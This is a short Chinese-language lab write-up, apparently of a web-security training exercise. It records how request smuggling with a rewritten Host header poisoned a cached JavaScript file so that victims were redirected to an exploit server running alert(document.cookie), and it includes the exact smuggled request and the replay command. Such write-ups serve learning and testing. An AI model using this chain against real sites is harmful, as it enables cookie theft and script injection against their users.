---
title: "lab-perform-web-cache-poisoning"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-perform-web-cache-poisoning

> evidences: [[request-smuggling-family]]

- 题面:前端不支持 chunked、前端缓存某些响应;目标 = 投毒缓存使后续对 JS 文件的请求 302 到 exploit server,毒缓存要 alert `document.cookie`。
- 实例(批 44)`0aba00ec04488309806f030c009800de`,exploit server `exploit-0a18009204e383b180ab02e701510042.exploit-server.net`(实例首页 `#exploit-link`)。
- 判定:**solved**(横幅 `Congratulations, you solved the lab!`)。

## 收口形

1. **302 的出处 = app 自己的 `/post/next?postId=3`**,其 Location 按 **Host 头**拼绝对 URL(直连实测 `Location: https://<Host>/post?postId=4`)⇒ 走私请求把它改写成 `Host: exploit-…`,`Location: https://exploit-…/post?postId=4`。
2. exploit server 存 **`/post`** = `alert(document.cookie)`,`responseHead` 两行(`HTTP/1.1 200 OK` + `Content-Type: text/javascript`)。
3. **arm(必须欠字节)**:`GET /post/next?postId=3 HTTP/1.1` + `Host: exploit-…` + `Content-Length: 10` + 体 `y=`(2B)⇒ 后端 holding;紧随的 `GET /resources/js/tracking.js`(缓存键)补全它 ⇒ 前端把 302 记在 `tracking.js` 上(`Cache-Control: max-age=30`、`X-Cache: hit` 实测)。
   - 反例:把走私请求写成**完整**请求 ⇒ 302 生成后**不进缓存**(批 44 实测:随后 GET tracking.js 仍是 200 JS)。
4. 受害者每轮开首页都会拉 `tracking.js`;毒在 TTL 内时浏览器拿到 302 ⇒ 跟到 exploit server 执行 `alert(document.cookie)` ⇒ 翻牌。
5. **持续续毒才算收口**:`smuggle_win` 快节奏(settle 1.5s / cooldown 4s,60 轮)把 `tracking.js` 的 302 几乎连续保持数分钟 ⇒ 受害者窗口内命中即解决。

## 复现

```
smuggle_win <lab>/ --smuggle 'GET /post/next?postId=3 HTTP/1.1\r\nHost: exploit-<id>.exploit-server.net\r\nContent-Length: 10\r\n\r\ny=' \
  --check <lab>/resources/js/tracking.js --marker NEVERMATCH --rounds 60 --settle-ms 1500 --cooldown-ms 4000
```
